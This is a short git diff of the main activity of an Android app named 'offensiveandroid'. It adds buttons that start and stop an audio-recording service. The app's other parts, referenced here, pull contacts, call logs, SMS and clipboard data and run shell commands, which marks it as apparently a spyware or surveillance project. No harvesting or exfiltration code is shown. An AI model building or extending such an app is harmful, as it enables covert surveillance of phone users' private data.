@@ -9,6 +9,7 @@ import android.os.Bundle
 import android.util.Log
 import android.widget.Button
 import android.widget.Toast
+import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.example.offensiveandroid.ui.theme.CallLogsRetriever
@@ -32,6 +33,8 @@ class MainActivity : AppCompatActivity() {
     private lateinit var clipboard : GetClipboard
     private lateinit var button : Button
     private lateinit var cmdExe : ShellCmdExe
+    private lateinit var start : Button
+    private lateinit var stop : Button
     companion object {
         const val REQUEST_LOCATION_SETTINGS = 1001
         const val BACKGROUND_LOCATION_REQUEST_CODE = 1002
@@ -39,10 +42,12 @@ class MainActivity : AppCompatActivity() {
 
 
 
+    @RequiresApi(Build.VERSION_CODES.O)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-
+        start = findViewById(R.id.button2)
+        stop = findViewById(R.id.button3)
         contacts = ContactsRetriever(this)
         callLogs = CallLogsRetriever(this)
         sms = SMSRetriever(this)
@@ -57,6 +62,17 @@ class MainActivity : AppCompatActivity() {
 
 
         checkAndRequestPermissions()
+
+        start.setOnClickListener {
+            val intent = Intent(this, AudioRecorder::class.java)
+            startForegroundService(intent)
+        }
+        stop.setOnClickListener {
+            val intent = Intent(this, AudioRecorder::class.java)
+            stopService(intent)
+
+        }
+
         try {
             val serviceIntent = Intent(this, MyForegroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
